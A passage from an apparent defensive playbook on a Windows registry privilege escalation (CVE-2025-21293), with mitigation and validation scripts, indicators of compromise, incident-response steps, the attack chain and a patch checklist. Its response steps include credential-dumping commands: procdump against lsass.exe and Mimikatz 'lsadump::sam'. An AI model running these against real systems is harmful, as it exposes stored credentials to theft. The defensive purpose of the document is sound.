    3. Name: `Block Registry Privilege Escalation Attempts`
    4. **Assignments:**
       - Users: All users
       - Conditions: Sign-in risk = High
    5. **Access controls:**
       - Grant: Require password change + MFA
    6. Enable: ON
    7. Click **Create**

*   **RBAC Enforcement:**
    - Implement least privilege through Role-Based Access Control
    - Remove unnecessary administrative group memberships
    
    **Manual Steps:**
    
    ```powershell
    # Audit high-privilege groups
    @("Domain Admins", "Enterprise Admins", "Schema Admins") | ForEach-Object {
        $Group = Get-ADGroup -Identity $_
        $Members = Get-ADGroupMember -Identity $Group -Recursive
        Write-Host "$_`: $($Members.Count) members"
        $Members | ForEach-Object { Write-Host "  - $($_.Name)" }
    }
    ```

#### Validation Command (Verify Fix)

```powershell
# Verify that Network Configuration Operators no longer has write/create rights
$Services = @("DnsCache", "NetBT", "TCPIP")

foreach ($Service in $Services) {
    $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$Service"
    $ACL = Get-Acl $RegPath
    
    $NCORules = $ACL.Access | Where-Object {
        $_.IdentityReference -like "*Network Configuration Operators*"
    }
    
    if ($NCORules.Count -eq 0) {
        Write-Host "[✓] $Service: Network Configuration Operators rights removed"
    } else {
        Write-Host "[✗] $Service: Still has Network Configuration Operators permissions"
        $NCORules | ForEach-Object { Write-Host "    - $($_.RegistryRights)" }
    }
}
```

**Expected Output (If Secure):**

```
[✓] DnsCache: Network Configuration Operators rights removed
[✓] NetBT: Network Configuration Operators rights removed
[✓] TCPIP: Network Configuration Operators rights removed
```

**What to Look For:**
- All target services should show "[✓]" confirmation
- Any remaining rules indicate incomplete mitigation

---

## 14. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Registry Keys:** Look for newly created subkeys under `HKLM\SYSTEM\CurrentControlSet\Services\DnsCache\Performance`, `NetBT\Performance`, or other service keys
*   **DLL Files:** Unexpected DLL files in non-standard locations (C:\Temp\, C:\Users\Public\, etc.) with recent modification times
*   **Process Execution:** wmic.exe or powershell.exe executing WMI queries followed by unusual process spawning
*   **Event Logs:** Event ID 4657 (registry modification) combined with Event ID 4688 (process creation)

#### Forensic Artifacts

*   **Registry:** Modified registry hives on affected system; last access time of Performance Counter subkeys
*   **Disk:** Malicious DLL file on disk (typically C:\Temp\ or similar); file timestamps
*   **Event Logs:** Event ID 4657, 4688, 4624 (logon events for affected user)
*   **Memory:** Running process handles and loaded DLLs in process address space

#### Response Procedures

1.  **Isolate:**
    - Immediately disconnect affected machine from network
    - If SYSTEM access gained, assume complete system compromise
    
    **Command:**
    
    ```powershell
    # Disable network adapters
    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
    
    # OR (older systems)
    ipconfig /release
    ```
    
    **Manual:** Disconnect network cable or disable NIC via BIOS/Settings

2.  **Collect Evidence:**
    - Export Security event logs
    
    ```powershell
    wevtutil epl Security C:\Evidence\Security.evtx
    wevtutil epl System C:\Evidence\System.evtx
    ```
    
    - Capture memory dump (if tools available)
    
    ```cmd
    procdump.exe -ma lsass.exe C:\Evidence\lsass.dmp
    ```
    
    - Collect malicious DLL
    
    ```powershell
    Copy-Item C:\Windows\Temp\malicious.dll C:\Evidence\
    ```

3.  **Remediate:**
    - Remove malicious registry entries
    
    ```powershell
    reg delete "HKLM\SYSTEM\CurrentControlSet\Services\DnsCache\Performance" /v Library /f
    ```
    
    - Delete malicious DLL
    
    ```powershell
    Remove-Item C:\Windows\Temp\malicious.dll -Force
    ```
    
    - Dump credentials (for threat hunting)
    
    ```powershell
    # If Mimikatz available and system already compromised
    mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
    ```
    
    - Restore from clean backup if available; otherwise rebuild system
    - Apply January 2025 security patch
    - Cycle all passwords for accounts that logged in during compromise window

4.  **Threat Hunt:**
    - Search for similar exploitation on other systems in the environment
    - Review logon history for affected user account
    - Identify all systems where affected user accessed resources
    - Review all outbound network connections from affected system during compromise period

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default credentials or [IA-PHISH-001] Phishing | Attacker gains initial foothold as low-privilege user on domain-joined machine |
| **2** | **Reconnaissance** | [REC-AD-002] LDAP enumeration | Attacker maps network and identifies high-value targets |
| **3** | **Privilege Escalation** | **[EMERGING-PE-002] CVE-2025-21293 Registry Escalation** | **Attacker leverages Network Configuration Operators group membership to gain SYSTEM** |
| **4** | **Credential Access** | [CA-DUMP-005] SAM database extraction or [CA-DUMP-003] LSA secrets | Attacker dumps local credentials from SYSTEM context |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash or [LM-REMOTE-001] SMB lateral movement | Attacker uses harvested credentials to move to Domain Controllers and high-value targets |

---

## 16. REAL-WORLD EXAMPLES

#### Example 1: Microsoft Security Update (January 2025)

- **Target:** Microsoft internal testing
- **Timeline:** January 2025 (patch release)
- **Technique Status:** FIXED (patched systems no longer vulnerable)
- **Impact:** Proof-of-concept demonstrated; patch immediately released to customers
- **Reference:** [CVE-2025-21293 Official Microsoft Advisory](https://msrc.microsoft.com/)

#### Example 2: NaviSec Security Research (August 2025)

- **Target:** Security research lab environment
- **Timeline:** August 2025
- **Technique Status:** ACTIVE on unpatched systems; FIXED on patched systems
- **Impact:** Detailed exploitation walk-through published; demonstrates credential harvesting post-SYSTEM access
- **Reference:** [NaviSec – CVE-2025-21293 Exploitation Guide](https://navisec.io/cve-2025-21293-privilege-escalation-vulnerability-and-mitigation/)

---

## 17. PATCH VERIFICATION CHECKLIST

- [ ] All Windows Server 2016/2019/2022/2025 systems have January 2025 patch applied
- [ ] All Windows 10/11 client systems have January 2025 patch applied
- [ ] Event ID 4657 (Registry modification) auditing is enabled on all domain controllers
- [ ] Network Configuration Operators group membership has been reviewed and restricted
- [ ] SIEM/Sentinel is monitoring for suspicious Performance Counter registry modifications
- [ ] Post-patch verification has confirmed that registry subkey creation is now blocked
- [ ] Incident response procedures for CVE-2025-21293 have been documented
- [ ] Backup/restoration procedures are tested and operational

---